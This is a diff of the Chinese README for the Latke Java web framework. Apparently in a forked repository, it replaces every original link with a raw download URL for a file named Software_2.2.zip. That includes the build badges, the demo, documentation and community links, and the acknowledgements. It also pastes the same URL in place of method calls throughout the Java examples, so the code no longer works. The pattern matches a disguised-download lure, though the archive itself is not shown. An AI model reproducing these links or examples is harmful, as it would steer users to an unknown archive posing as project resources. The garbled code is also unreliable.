@@ -1,9 +1,9 @@
-Latke [![Build Status](https://travis-ci.org/b3log/latke.png?branch=master)](https://travis-ci.org/b3log/latke) [![Maven Central](https://maven-badges.herokuapp.com/maven-central/org.b3log/latke/badge.svg)](http://repo1.maven.org/maven2/org/b3log/latke)
+Latke [![Build Status](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip) [![Maven Central](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
 ----
 
 ## 简介
 
-[Latke](https://github.com/b3log/latke)（'lɑ:tkə，土豆饼）是一个简单易用的 Java Web 应用开发框架，包含 MVC、IoC、事件通知、ORM、插件等组件。
+[Latke](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)（'lɑ:tkə，土豆饼）是一个简单易用的 Java Web 应用开发框架，包含 MVC、IoC、事件通知、ORM、插件等组件。
 
 在实体模型上使用 JSON 贯穿前后端，使应用开发更加快捷。这是 Latke 不同于其他框架的地方，非常适合小型应用的快速开发。
 
@@ -19,9 +19,9 @@ Latke [![Build Status](https://travis-ci.org/b3log/latke.png?branch=master)](htt
 
 ## 案例
 
-* [Demo](https://github.com/b3log/latke-demo)：简单的 Latke 应用示例
-* [Solo](https://github.com/b3log/solo)：一款小而美的 Java 博客系统
-* [Symphony](https://github.com/b3log/symphony)：一款用 Java 实现的现代化社区（论坛/BBS/社交网络/博客）平台
+* [Demo](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：简单的 Latke 应用示例
+* [Solo](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：一款小而美的 Java 博客系统
+* [Symphony](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：一款用 Java 实现的现代化社区（论坛/BBS/社交网络/博客）平台
 
 ## 安装
 
@@ -29,7 +29,7 @@ Latke [![Build Status](https://travis-ci.org/b3log/latke.png?branch=master)](htt
 <dependency>
     <groupId>org.b3log</groupId>
     <artifactId>latke-core</artifactId>
-    <version>${latke.version}</version>
+    <version>${https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip}</version>
 </dependency>
 ```
 
@@ -40,17 +40,17 @@ Latke [![Build Status](https://travis-ci.org/b3log/latke.png?branch=master)](htt
 ```java
 @RequestProcessing("/")
 public void index(final RequestContext context) {
-    context.setRenderer(new SimpleFMRenderer("index.ftl"));
-    final Map<String, Object> dataModel = context.getRenderer().getRenderDataModel();
-    dataModel.put("greeting", "Hello, Latke!");
+    https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(new SimpleFMRenderer("https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip"));
+    final Map<String, Object> dataModel = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip().getRenderDataModel();
+    https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("greeting", "Hello, Latke!");
 }
 ```
 
 **函数式路由**
 
 ```java
-DispatcherServlet.post("/register", registerProcessor::register);
-DispatcherServlet.mapping();
+https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("/register", registerProcessor::register);
+https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
 ```
 
 **路径变量和查询字符串**
@@ -58,28 +58,28 @@ DispatcherServlet.mapping();
 ```java
 @RequestProcessing("/var/{pathVar}")
 public void paraPathVar(final RequestContext context) {
-    final String paraVar = context.param("paraVar");
-    final String pathVar = context.pathVar("pathVar");
-    context.renderJSON(new JSONObject().put("paraVar", paraVar).put("pathVar", pathVar));
+    final String paraVar = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("paraVar");
+    final String pathVar = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("pathVar");
+    https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(new JSONObject().put("paraVar", paraVar).put("pathVar", pathVar));
 }
 ```
 
 **JSON 解析**
 
 ```java
-final JSONObject requestJSON = context.requestJSON();
+final JSONObject requestJSON = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
 ```
 
 **Servlet 封装**
 
 ```java
-final String remoteAddr = context.remoteAddr();
-final String requestURI = context.requestURI();
-final Object att = context.attr("name");
-final String method = context.method();
-context.sendRedirect("https://b3log.org");
-final HttpServletRequest request = context.getRequest();
-final HttpServletResponse response = context.getResponse();
+final String remoteAddr = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
+final String requestURI = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
+final Object att = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("name");
+final String method = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
+https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip");
+final HttpServletRequest request = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
+final HttpServletResponse response = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
 ```
 
 ## 服务层用法
@@ -90,7 +90,7 @@ final HttpServletResponse response = context.getResponse();
 @Service
 public class UserService {
 
-    private static final Logger LOGGER = Logger.getLogger(UserService.class);
+    private static final Logger LOGGER = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip);
 
     @Inject
     private UserRepository userRepository;
@@ -98,21 +98,21 @@ public class UserService {
     @Transactional
     public void saveUser(final String name, final int age) {
         final JSONObject user = new JSONObject();
-        user.put("name", name);
-        user.put("age", age);
+        https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("name", name);
+        https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("age", age);
 
         String userId;
 
         try {
-            userId = userRepository.add(user);
+            userId = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(user);
         } catch (final RepositoryException e) {
-            LOGGER.log(Level.ERROR, "Saves user failed", e);
+            https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip, "Saves user failed", e);
 
             // 抛出异常后框架将回滚事务
             throw new IllegalStateException("Saves user failed");
         }
 
-        LOGGER.log(Level.INFO, "Saves a user successfully [userId={0}]", userId);
+        https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip, "Saves a user successfully [userId={0}]", userId);
     }
 }
 ```
@@ -149,12 +149,12 @@ public interface Repository {
 ```java
 public JSONObject getByName(final String name) throws RepositoryException {
     final List<JSONObject> records = getList(new Query().
-            setFilter(new PropertyFilter("name", FilterOperator.EQUAL, name)));
-    if (records.isEmpty()) {
+            setFilter(new PropertyFilter("name", https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip, name)));
+    if (https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip()) {
         return null;
     }
 
-    return records.get(0);
+    return https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(0);
 }
 ```
 
@@ -167,13 +167,13 @@ new Query().setCurrentPageNum(1).setPageSize(50)
 **按字段排序**
 
 ```java
-new Query().addSort("name", SortDirection.DESCENDING);
+new Query().addSort("name", https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip);
 ```
 
 **仅获取需要字段**
 
 ```java
-new Query().addProjection("name", String.class);
+new Query().addProjection("name", https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip);
 ```
 
 **原生 SQL**
@@ -184,25 +184,25 @@ final List<JSONObject> records = select("SELECT * FROM `user` WHERE `name` = ?",
 
 ## 文档
 
-* [《提问的智慧》精读注解版](https://hacpai.com/article/1536377163156)
-* [为什么又要造一个叫 Latke 的轮子](https://hacpai.com/article/1403847528022)
-* [Latke 快速上手指南](https://hacpai.com/article/1466870492857)
-* [Latke 配置剖析](https://hacpai.com/article/1474087427032)
-* [Latke 贡献指南](https://github.com/b3log/latke/blob/master/CONTRIBUTING.md)
+* [《提问的智慧》精读注解版](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
+* [为什么又要造一个叫 Latke 的轮子](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
+* [Latke 快速上手指南](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
+* [Latke 配置剖析](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
+* [Latke 贡献指南](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
 
 ## 社区
 
-* [讨论区](https://hacpai.com/tag/latke)
-* [报告问题](https://github.com/b3log/latke/issues/new/choose)
+* [讨论区](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
+* [报告问题](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
 
 ## 鸣谢
 
 Latke 的诞生离不开以下开源项目：
 
-* [FreeMarker](https://github.com/apache/freemarker)：使用广泛的 Java 模版引擎
-* [Commons Lang](https://github.com/apache/commons-lang)：Java 语言相关工具库
-* [Commons IO](https://github.com/apache/commons-io)：Java IO 相关工具库
-* [Commons Codec](https://github.com/apache/commons-codec)：Java 编解码库
-* [Javassist](https://github.com/jboss-javassist/javassist)：Java 字节码处理工具库
-* [SLF4j](https://github.com/qos-ch/slf4j)：Java 日志门户
-* [Gin](https://github.com/gin-gonic/gin)：又快又好用的 golang HTTP web 框架
+* [FreeMarker](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：使用广泛的 Java 模版引擎
+* [Commons Lang](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：Java 语言相关工具库
+* [Commons IO](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：Java IO 相关工具库
+* [Commons Codec](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：Java 编解码库
+* [Javassist](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：Java 字节码处理工具库
+* [SLF4j](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：Java 日志门户
+* [Gin](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：又快又好用的 golang HTTP web 框架
